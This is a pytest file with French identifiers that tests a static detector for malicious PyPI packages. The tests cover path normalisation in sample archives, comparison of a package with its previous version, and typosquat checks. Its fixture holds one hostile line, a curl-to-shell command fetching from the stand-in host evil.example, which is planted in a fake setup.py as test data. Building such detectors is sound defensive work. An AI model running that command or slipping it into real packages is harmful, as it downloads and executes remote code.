"""Mesure v1, contrôles statiques seuls (B) : nom + code, sur des échantillons lus, jamais exécutés.

Les échantillons de test sont fabriqués ici (zips non chiffrés : `zipfile` ne sait pas chiffrer, et
la lecture avec mot de passe accepte aussi un zip en clair).
"""
import importlib.util
import zipfile
from pathlib import Path

from commun.modeles import Ecosysteme, Niveau

RACINE = Path(__file__).resolve().parents[2]
_spec = importlib.util.spec_from_file_location("statique_mesure", RACINE / "mesure" / "statique.py")
statique = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(statique)

P = Ecosysteme.PYPI
PIEGE = 'import os\nos.system("curl -s http://evil.example/x | sh")\n'
SAIN = "def f():\n    return 1\n"


def zip_echantillon(chemin: Path, fichiers: dict[str, str]) -> Path:
    with zipfile.ZipFile(chemin, "w") as z:
        for nom, texte in fichiers.items():
            z.writestr(nom, texte)
    return chemin


def test_les_chemins_sont_ramenes_a_la_racine_du_paquet():
    noms = [
        "tmp/tmpab/demo/package_info-demo-1.0.json",
        "tmp/tmpab/demo/demo-1.0/PKG-INFO",
        "tmp/tmpab/demo/demo-1.0/setup.py",
        "tmp/tmpab/demo/demo-1.0/demo/__init__.py",
    ]
    assert statique.chemins_relatifs(noms) == {
        "tmp/tmpab/demo/demo-1.0/setup.py": "setup.py",
        "tmp/tmpab/demo/demo-1.0/demo/__init__.py": "demo/__init__.py",
        "tmp/tmpab/demo/demo-1.0/PKG-INFO": "PKG-INFO",
    }


def test_une_roue_depliee_garde_ses_chemins_de_roue():
    noms = ["tmp/x/pxz/package_info-pxz-1.1.json", "tmp/x/pxz/pxz-1.1.dist-info/METADATA",
            "tmp/x/pxz/pxz/__init__.py", "tmp/x/pxz/pxz/a/b.py"]
    rel = statique.chemins_relatifs(noms)
    assert rel["tmp/x/pxz/pxz/__init__.py"] == "pxz/__init__.py"
    assert rel["tmp/x/pxz/pxz/a/b.py"] == "pxz/a/b.py"


def test_un_chemin_double_par_le_jeu_de_donnees_est_ramene_au_vrai_chemin():
    noms = ["tmp/t/ultra/package_info-ultra-8.3.json",
            "tmp/t/ultra/ultra/__init__.py/ultra/__init__.py",
            "tmp/t/ultra/ultra/a/b.py/ultra/a/b.py"]
    rel = statique.chemins_relatifs(noms)
    assert rel["tmp/t/ultra/ultra/__init__.py/ultra/__init__.py"] == "ultra/__init__.py"
    assert rel["tmp/t/ultra/ultra/a/b.py/ultra/a/b.py"] == "ultra/a/b.py"


def test_sans_repere_on_retire_le_prefixe_commun():
    noms = ["var/folders/rs/abc/T/tmp1/pkg/__init__.py", "var/folders/rs/abc/T/tmp1/pkg/m.py"]
    assert set(statique.chemins_relatifs(noms).values()) == {"__init__.py", "m.py"}


def test_un_echantillon_piege_est_arrete_par_le_code(tmp_path):
    ech = zip_echantillon(tmp_path / "e.zip", {"t/x/mal/mal-1.0/setup.py": PIEGE,
                                               "t/x/mal/mal-1.0/PKG-INFO": "Name: mal\n"})
    signaux = statique.signaux_echantillon(P, "mal", "1.0", ech)
    assert any(s.niveau.rang >= Niveau.FORT.rang and s.preuve["fichier"] == "setup.py"
               for s in signaux)


def test_le_detecteur_lit_les_echantillons_et_compare_les_sains_a_leur_precedente(tmp_path):
    ech = zip_echantillon(tmp_path / "e.zip", {"t/mal-1.0/setup.py": PIEGE,
                                               "t/mal-1.0/PKG-INFO": "x"})
    corpus = {"malveillants": [{"ecosysteme": "pypi", "nom": "mal", "version": "1.0",
                                "echantillon": "e.zip"}],
              "sains": [{"ecosysteme": "pypi", "nom": "outil", "version": "2.0",
                         "version_precedente": "1.0"}]}
    demandes = []

    def telecharger(nom, version, dossier):
        demandes.append((nom, version))
        # La même ligne suspecte dans 1.0 et 2.0 : déjà là avant, donc pas une alerte.
        return [zip_echantillon(tmp_path / f"{nom}-{version}.whl",
                                {"setup.py": PIEGE, "outil/__init__.py": SAIN})]

    detecteur = statique.detecteur(corpus, echantillons=tmp_path, telecharger=telecharger,
                                   cache=tmp_path / "cache")
    assert any(s.niveau.rang >= Niveau.FORT.rang for s in detecteur(P, "mal", "1.0"))
    assert all(s.niveau.rang < Niveau.FORT.rang for s in detecteur(P, "outil", "2.0"))
    assert sorted(demandes) == [("outil", "1.0"), ("outil", "2.0")]


def test_le_detecteur_compte_aussi_le_controle_du_nom(tmp_path):
    corpus = {"malveillants": [], "sains": [{"ecosysteme": "pypi", "nom": "reqeusts",
                                             "version": "1.0", "version_precedente": "0.9"}]}
    detecteur = statique.detecteur(corpus, echantillons=tmp_path,
                                   telecharger=lambda n, v, d: [], cache=tmp_path)
    assert "typosquat" in {s.sorte for s in detecteur(P, "reqeusts", "1.0")}


def test_un_telechargement_impossible_est_note_et_sort_du_compte(tmp_path):
    corpus = {"malveillants": [], "sains": [{"ecosysteme": "pypi", "nom": "outil",
                                             "version": "2.0", "version_precedente": "1.0"}]}

    def echoue(nom, version, dossier):
        raise LookupError("aucun fichier pour la cible")

    detecteur = statique.detecteur(corpus, echantillons=tmp_path, telecharger=echoue,
                                   cache=tmp_path)
    assert detecteur(P, "outil", "2.0") is None          # non mesurable : hors du compte
    assert detecteur.illisibles == {"outil 2.0": "aucun fichier pour la cible"}


def test_deux_copies_du_meme_fichier_sont_toutes_les_deux_lues(tmp_path):
    """Un échantillon garde parfois deux copies du paquet : le piège peut n'être que dans l'une.
    Le piège est écrit en premier : dans une seule roue, la seconde copie l'aurait masqué."""
    fichiers = {"t/x/sources/lib/setup.py": PIEGE, "t/x/sources/lib/PKG-INFO": "x",
                "t/x/lib/lib-2.0/setup.py": SAIN, "t/x/lib/lib-2.0/PKG-INFO": "x"}
    rel = statique.chemins_relatifs(list(fichiers))
    assert rel["t/x/sources/lib/setup.py"] == rel["t/x/lib/lib-2.0/setup.py"] == "setup.py"
    signaux = statique.signaux_echantillon(P, "lib", "2.0", zip_echantillon(tmp_path / "e.zip",
                                                                         fichiers))
    assert any(s.niveau.rang >= Niveau.FORT.rang for s in signaux)


def test_un_echantillon_qui_contient_une_seule_archive_est_ouvert_dedans(tmp_path):
    interieur = zip_echantillon(tmp_path / "interieur.zip", {"mal-1.0/setup.py": PIEGE,
                                                            "mal-1.0/PKG-INFO": "x"})
    ech = zip_echantillon(tmp_path / "e.zip", {})
    with zipfile.ZipFile(ech, "w") as z:
        z.write(interieur, "2026-03-24-mal-v1.0.zip")
    signaux = statique.signaux_echantillon(P, "mal", "1.0", ech)
    assert any(s.niveau.rang >= Niveau.FORT.rang and s.preuve["fichier"] == "setup.py"
               for s in signaux)
